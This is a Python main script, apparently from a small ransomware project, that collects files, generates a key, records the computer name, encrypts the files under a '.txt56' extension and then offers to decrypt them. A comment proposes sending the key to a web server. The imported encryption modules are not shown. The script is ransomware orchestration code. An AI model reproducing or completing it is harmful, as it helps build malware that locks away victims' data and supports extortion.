import os
from Encryption.Encryptor import Encryptor
from Decryption.Decryptor import Decryptor
from Encryption.EncryptorRepository import EncryptorRepository
from Decryption.DecryptorRepository import DecryptorRepository

MyEncryptor = Encryptor()

MyEncryptorRepository = EncryptorRepository()
MyEncryptorRepository.setEncryptor(MyEncryptor)

#### Encryption ####

MyEncryptor.setEncryptionLevel(16)
MyEncryptor.setEncryptedExtensions(('.txt56',))
MyEncryptor.setFilesToEncrypt(MyEncryptorRepository.grab_files())
MyEncryptor.setEncryptionKey(MyEncryptorRepository.generateEncryptionKey())
MyEncryptor.setComputerName(os.getenv('COMPUTERNAME'))
MyEncryptorRepository.EncryptFiles(MyEncryptor.getFilesToEncrypt(), MyEncryptor.getEncryptionKey())

####################


#### Backup Key ####

# Send the key to a web server for example, to decrypt file later

####################


#### Decryption ####

choice = input('Would you like to decrypt your files ? (y/n) : ')

if choice=='y':
    MyDecryptor = Decryptor()

    MyDecryptorRepository = DecryptorRepository()
    MyDecryptorRepository.setDecryptor(MyDecryptor)

    MyDecryptor.setEncryptionLevel(16)
    MyDecryptor.setFilesToDecrypt(MyEncryptor.getFilesToEncrypt())
    MyDecryptor.setEncryptionKey(MyEncryptor.getEncryptionKey())
    MyDecryptorRepository.DecryptFiles()

else:
    print('Decryption abborted.')

####################